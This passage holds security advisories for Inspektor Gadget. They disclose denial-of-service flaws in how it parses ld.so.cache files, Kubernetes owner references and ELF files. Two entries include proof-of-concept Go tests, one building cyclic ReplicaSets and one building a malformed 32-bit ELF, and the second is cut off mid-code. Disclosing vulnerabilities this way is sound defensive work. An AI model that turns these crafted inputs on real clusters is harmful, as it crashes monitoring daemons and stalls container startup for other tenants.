CVE-2026-53941.description: Inspektor Gadget is a set of tools and framework for data collection and system inspection on Kubernetes clusters and Linux hosts using eBPF. From 0.27.0 until 0.53.1, the uprobe library resolver can allow an unprivileged container to consume excessive CPU and block other containers from starting by supplying a crafted /etc/ld.so.cache file while an uprobe-based gadget is active. The parser in pkg/uprobetracer/ldcache_parser.go trusts EntryCount enough to perform excessive iteration, computes cache1Len with overflowing uint32 arithmetic, and repeatedly calls readStringFromBytes in pkg/uprobetracer/bytes.go, where byte-by-byte immutable string concatenation produces quadratic work. While this processing occurs, pkg/container-hook holds the fanotify container-start pause, allowing a crafted cache to delay startup for roughly a minute, prevent Docker from starting other containers, and degrade monitoring. Processing caches from already-running containers can still consume CPU but does not hold the new-container startup pause, and the advisory establishes no confidentiality or integrity impact. This issue is fixed in version 0.53.1.

GHSA-2726-gm5r-r7v4.title: Unbounded owner-reference walk in Kubernetes enrichment lets a namespaced user hang the container hook and wedge container creation on a node
GHSA-2726-gm5r-r7v4.description: ## Summary Denial of service via unbounded owner-reference walk in Kubernetes enrichment. Inspektor Gadget's `WithKubernetesEnrichment` option resolves a container's controller by walking `metadata.ownerReferences` in a bare `for {}` loop with no visited set and no depth cap (`pkg/container-collection/containers.go:165`, inside `ownerReferenceEnrichment`). Kubernetes tolerates cyclic owner references, so a namespaced tenant that can create Pods and controller objects (Deployment/ReplicaSet/StatefulSet/DaemonSet/Job/CronJob/ReplicationController) in their own namespace can craft a cycle (e.g. two ReplicaSets that own each other) and cause the enricher to loop forever. ## Impact Attacker model: an authenticated, ordinary namespaced Kubernetes tenant with standard namespaced write RBAC on Pods and on at least one of the 'expected' controller kinds. No cluster-scoped permission, no gadget-specific RBAC, and no interaction with the gadget's gRPC or auth surface is required. On any cluster where Inspektor Gadget is installed via `kubectl gadget deploy` (or where a library consumer registers `WithKubernetesEnrichment`), the tenant only has to have a pod scheduled on a node — automatic given the gadget runs as a DaemonSet on every node. Reproduced consequences: - The `ownerReferenceEnrichment` goroutine spins forever, issuing on the order of ~400k apiserver GETs per second per stuck enrichment from the gadget's service account (measured: 1.3M–2.0M GETs over a 5s observation window). - Total, silent loss of runtime-security observability on the targeted node — the gadget process appears healthy but is wedged inside the enricher. Argued consequence (from source and maintainer comments at `pkg/container-hook/tracer.go:557,671,880-925`, not reproduced end-to-end): the enricher is called synchronously from the fanotify `FAN_ACCESS_PERM` callback with `defer n.pidFileDirNotify.ResponseAllow(data)` still pending, so an unterminated enrichment holds the kernel-side permission response and stalls the container runtime's pid-file read, wedging container creation on the affected node. ## Affected versions - `<= 0.56.1` — the loop is present, unmodified, at HEAD (commit `8533290016af12af0ea65a7663e8084d190a6a3b`) and was verified against the published `pkg:golang/github.com/inspektor-gadget/inspektor-gadget@v0.56.0`. The Helm chart `gadget/gadget` at `0.56.0` and the Gentoo package `app-admin/ig` at `0.54.1` ship binaries built from this module and are affected in the same way. ## Patched versions - `>= v0.56.2` — the loop was modified, in commit `8fbd113e4d6dbc989ce2523026a9f09c7ddebad4`. ## Proof of concept Reproduced with `k8s.io/client-go/dynamic/fake` against the repository's own `ownerReferenceEnrichment`, so the apiserver behaviour is client-go's, not a mock. The test is written to **fail** if the loop terminates; it passes only because the function never returns. Add `pkg/container-collection/zz_repro_test.go`: ```go package containercollection import ( 'sync/atomic' 'testing' 'time' metav1 'k8s.io/apimachinery/pkg/apis/meta/v1' 'k8s.io/apimachinery/pkg/apis/meta/v1/unstructured' 'k8s.io/apimachinery/pkg/runtime' 'k8s.io/apimachinery/pkg/runtime/schema' dynamicfake 'k8s.io/client-go/dynamic/fake' k8stesting 'k8s.io/client-go/testing' ) func obj(apiVersion, kind, ns, name string, owners ...metav1.OwnerReference) *unstructured.Unstructured { u := &unstructured.Unstructured{} u.SetAPIVersion(apiVersion); u.SetKind(kind) u.SetNamespace(ns); u.SetName(name) if len(owners) > 0 { u.SetOwnerReferences(owners) } return u } func ownerRef(kind, name string) metav1.OwnerReference { api := 'apps/v1' if kind == 'Pod' { api = 'v1' } return metav1.OwnerReference{APIVersion: api, Kind: kind, Name: name} } func TestOwnerReferenceCycle(t *testing.T) { scheme := runtime.NewScheme() gvr := map[schema.GroupVersionResource]string{ {Group: '', Version: 'v1', Resource: 'pods'}: 'PodList', {Group: 'apps', Version: 'v1', Resource: 'replicasets'}: 'ReplicaSetList', {Group: 'apps', Version: 'v1', Resource: 'deployments'}: 'DeploymentList', } // evil-pod -> rs-a -> rs-b -> rs-a ... pod := obj('v1', 'Pod', 'tenant-a', 'evil-pod', ownerRef('ReplicaSet', 'rs-a')) rsA := obj('apps/v1', 'ReplicaSet', 'tenant-a', 'rs-a', ownerRef('ReplicaSet', 'rs-b')) rsB := obj('apps/v1', 'ReplicaSet', 'tenant-a', 'rs-b', ownerRef('ReplicaSet', 'rs-a')) client := dynamicfake.NewSimpleDynamicClientWithCustomListKinds(scheme, gvr, pod, rsA, rsB) var gets int64 client.PrependReactor('get', '*', func(a k8stesting.Action) (bool, runtime.Object, error) { atomic.AddInt64(&gets, 1); return false, nil, nil }) c := &Container{} c.K8s.Namespace = 'tenant-a'; c.K8s.PodName = 'evil-pod' done := make(chan error, 1) go func() { done <- ownerReferenceEnrichment(client, c, nil) }() select { case err := <-done: t.Fatalf('returned (err=%v) after %d GETs: cycle broken', err, atomic.LoadInt64(&gets)) case <-time.After(5 * time.Second): n := atomic.LoadInt64(&gets) t.Logf('STILL RUNNING after 5s: %d apiserver GETs', n) if n < 1000 { t.Fatalf('expected unbounded GETs, got %d', n) } } } ``` Run: ``` go test ./pkg/container-collection/ -run TestOwnerReferenceCycle -v -timeout 120s -count=1 ``` Expected: `STILL RUNNING after 5s: <N> apiserver GETs`, with `N` in the millions. In production the same call site is reached automatically: `pkg/operators/kubemanager/kubemanager.go:197-206` registers `WithKubernetesEnrichment` unconditionally, `pkg/container-collection/options.go:611` calls `container.GetOwnerReference(...)` on every new container, and `pkg/container-hook/tracer.go:670` invokes the enricher chain synchronously from the fanotify `FAN_ACCESS_PERM` handler with `defer n.pidFileDirNotify.ResponseAllow(data)` still pending (`tracer.go:557-558`). ## Fix suggestion The guard belongs inside the loop at `pkg/container-collection/containers.go:165` in `ownerReferenceEnrichment`. Either a visited set keyed on `(namespace, kind, name)` or a small hard depth cap is sufficient — the legitimate chains (Pod→ReplicaSet→Deployment, Pod→Job→CronJob) are depth 3, so a cap of 8 leaves ample headroom. Separately, and worth doing independently, the enricher chain invoked from `pkg/container-hook/tracer.go:670` should run under a deadline so that any future enricher bug cannot wedge the fanotify `FAN_ACCESS_PERM` response and, through it, container creation on the node. ## References - https://github.com/inspektor-gadget/inspektor-gadget/blob/main/pkg/container-collection/containers.go#L165 — the vulnerable `for {}` in `ownerReferenceEnrichment` - https://github.com/inspektor-gadget/inspektor-gadget/blob/main/pkg/container-collection/options.go#L611 — unconditional call site inside `WithKubernetesEnrichment` - https://github.com/inspektor-gadget/inspektor-gadget/blob/main/pkg/operators/kubemanager/kubemanager.go#L197-L206 — where the enricher is registered in every `kubectl gadget deploy` - https://github.com/inspektor-gadget/inspektor-gadget/blob/main/pkg/container-hook/tracer.go#L557-L671 — synchronous invocation from the fanotify `FAN_ACCESS_PERM` callback with a deferred `ResponseAllow` - https://cwe.mitre.org/data/definitions/835.html — CWE-835: Loop with Unreachable Exit Condition ('Infinite Loop')

GHSA-46wr-66jx-fr4g.title: Memory exhaustion in privileged daemon via crafted ELF string table in container
GHSA-46wr-66jx-fr4g.description: ## Description Inspektor Gadget's privileged daemon (running as a DaemonSet on Kubernetes nodes or as `ig` on Linux hosts) parses ELF binaries from containers for symbolization and uprobe attachment. Several code paths perform unbounded memory allocations based on ELF section sizes controlled by an attacker: 1. **Symbolizer string table exhaustion**: The symbolizer calls Go's `debug/elf.Symbols()` which unconditionally loads the entire `.strtab` section into memory. A crafted ELF with a single symbol but a ~499 MB string table causes a corresponding allocation in the privileged daemon. This is triggered automatically when the daemon symbolizes stack traces from a container running the crafted binary. 2. **Uprobe/USDT attachment via cilium/ebpf**: When attaching uprobes, cilium/ebpf's `link.OpenExecutable()` loads all symbols into memory via the same `debug/elf.Symbols()` path. A crafted binary targeted by a uprobe gadget causes the same exhaustion. 3. **USDT note iteration**: The USDT parser iterates ELF notes without a cap on the number of iterations, allowing CPU exhaustion via a crafted note section with millions of entries. 4. **Debuginfod file size bypass**: Debug information files fetched via debuginfod are not checked against the existing `MaxExecutableSize` limit before parsing, allowing an oversized file to bypass the size check. ### Impact An unprivileged attacker who can run a container on a node where Inspektor Gadget is deployed can cause the privileged daemon to allocate up to ~500 MB of memory per crafted binary encountered. Repeated exploitation or multiple crafted binaries can exhaust node memory, causing the daemon to be OOM-killed or degrading node stability. This constitutes a denial-of-service from an unprivileged container against the privileged monitoring infrastructure. ### Patches Fixed by: - Replacing `debug/elf.Symbols()` with a bounded symbol iterator that reads string table entries on demand without loading the full section - Adding size caps on string table sections (256 MiB) - Resolving symbols within Inspektor Gadget and passing file offsets to cilium/ebpf, bypassing its Symbols()/DynamicSymbols() path entirely as they don't limit memory consumption - Adding a note iteration cap (10,000) to USDT parsing - Adding file size validation to the debuginfod path Available in v0.55.1 and above. ### Workarounds - Do not use uprobe/USDT gadgets - Do not use the symbolizer (stack trace symbolization) - Limit which containers are monitored (using namespace/pod selectors) - Set memory limits on the Inspektor Gadget DaemonSet to prevent node-wide impact (at the cost of the daemon being OOM-killed)

GHSA-6m8m-w75g-h8qr.title: Crafted 32-bit ELF from an unprivileged container crashes the privileged Inspektor Gadget USDT note parser
GHSA-6m8m-w75g-h8qr.description: ## Summary The USDT note parser in `pkg/uprobetracer/usdt.go` (`getUsdtInfo`) can be driven to a Go runtime panic by an unprivileged container that ships a crafted 32-bit (ELFCLASS32) ELF containing a `.note.stapsdt` note. When a USDT-based gadget attaches to a library inside the container, the privileged Inspektor Gadget process parses the attacker-supplied note and panics with an index-out-of-range error. The panic occurs on a container-attach goroutine that has no panic recovery, so it terminates the entire privileged process. This is a bypass of the fix shipped for CVE-2026-44778 (GHSA-7cfq-5mhv-jrp9): the fix added a desc-length guard sized for the parser's word size, but the address fields are still read at a fixed 8-byte width, so a 32-bit note that satisfies the guard still over-reads. ## Root Cause The parser derives `wordSize` from the ELF class (4 for ELFCLASS32, 8 for ELFCLASS64) and computes `minDescSize := 3 * wordSize`. For a 32-bit file this is 12. The bounds guard rejects a note only when `len(desc) < minDescSize`, so a note with an aligned desc length of exactly 12 passes. The address fields are then read with `elfReader.ByteOrder.Uint64(desc[:wordSize])`. On a 32-bit file this evaluates to `Uint64(desc[:4])`: a slice of length 4. `binary.LittleEndian.Uint64` (and BigEndian) begins by evaluating `_ = b[7]`, and Go performs the bounds check against the slice length (4), not the underlying array capacity (12). The result is a panic, `index out of range [7] with length 4`. The violated invariant is that a length guard sized in `wordSize` units cannot protect reads performed at a fixed 8-byte width; the guard and the read use inconsistent widths. The advisory for CVE-2026-44778 also stated that `getUsdtInfo` would be wrapped in defer/recover to contain any parser panic; that recovery was not implemented, so the panic is uncontained. ```text Affected function: getUsdtInfo Location: pkg/uprobetracer/usdt.go - usdt.go: wordSize = 4 for ELFCLASS32; minDescSize = 3 * wordSize = 12 - usdt.go: guard `if len(desc) < minDescSize` passes when len(desc) == 12 - usdt.go: elfReader.ByteOrder.Uint64(desc[:wordSize]) reads b[7] of a length-4 slice -> panic No defer/recover exists in getUsdtInfo; the only recover() in the package wraps safeelf.NewFile (the ELF header parse), not the note-parsing loop. ``` ## Impact An unprivileged tenant who can schedule a workload or place a file inside a container on a monitored node can crash the privileged Inspektor Gadget process on that node. The prerequisite is that a USDT-based gadget (an eBPF program with a `usdt/...` section) is deployed and targeting a library path that the attacker's container can supply; no gadget shipped by the project uses USDT, so this affects deployments running a custom USDT gadget. This matches the reachability precondition of the parent advisory CVE-2026-44778, which the maintainers rated Low. The demonstrated capability is availability loss: the per-node DaemonSet process terminates, dropping security monitoring on that node. Because the attach runs on container start, the attacker can restart the container to crash-loop the process and sustain the outage. Confidentiality and integrity are not affected. The attacker operates within an unprivileged container but the impact lands on the privileged host process, a change of security authority. ## Proof of Concept `Dependencies: a Go toolchain and a checkout of the repository. getUsdtInfo is unexported, so the reproduction is an in-package test.` Reproduction steps: 1. Copy the test below into `pkg/uprobetracer/zz_poc_usdt32_test.go`. 2. Run `go test ./pkg/uprobetracer/ -run TestPoCUSDT -v`. 3. Remove the file afterward. The test builds a minimal little-endian ELF with one valid `stapsdt` note (`NameSize=8`, `DescSize=12`, `Type=3`) plus a `.stapsdt.base` PROGBITS section, then calls `getUsdtInfo`. The 32-bit case panics; a byte-analogous 64-bit case (desc length 24) does not, isolating the defect to the ELFCLASS32 read-width branch. ```go package uprobetracer import ( 'encoding/binary' 'os' 'path/filepath' 'testing' ) // buildELF builds a minimal little-endian ELF (class 1 = ELFCLASS32, // class 2 = ELFCLASS64) with a .note.stapsdt section holding one valid // stapsdt note plus a .stapsdt.base PROGBITS section. descSize sets the // note desc length. func buildELF(class byte, descSize uint32) []byte { le := binary.LittleEndian is64 := class == 2 note := make([]byte, 0, 32) hdr := make([]byte, 12) le.PutUint32(hdr[0:], 8) // NameSize ('stapsdt\0') le.PutUint32(hdr[4:], descSize) // DescSize le.PutUint32(hdr[8:], 3) // Type == 3 (stapsdt) note = append(note, hdr...) note = append(note, []byte('stapsdt\x00')...) note = append(note, make([]byte, descSize)...) shstr := []byte{0} nameOff := func(s string) uint32 { off := uint32(len(shstr)) shstr = append(shstr, []byte(s)...) shstr = append(shstr, 0) return off } offNote := nameOff('.note.stapsdt') offBase := nameOff('.stapsdt.base') offShstr := nameOff('.shstrtab') var ehSize, shEntSize uint32 if is64 {
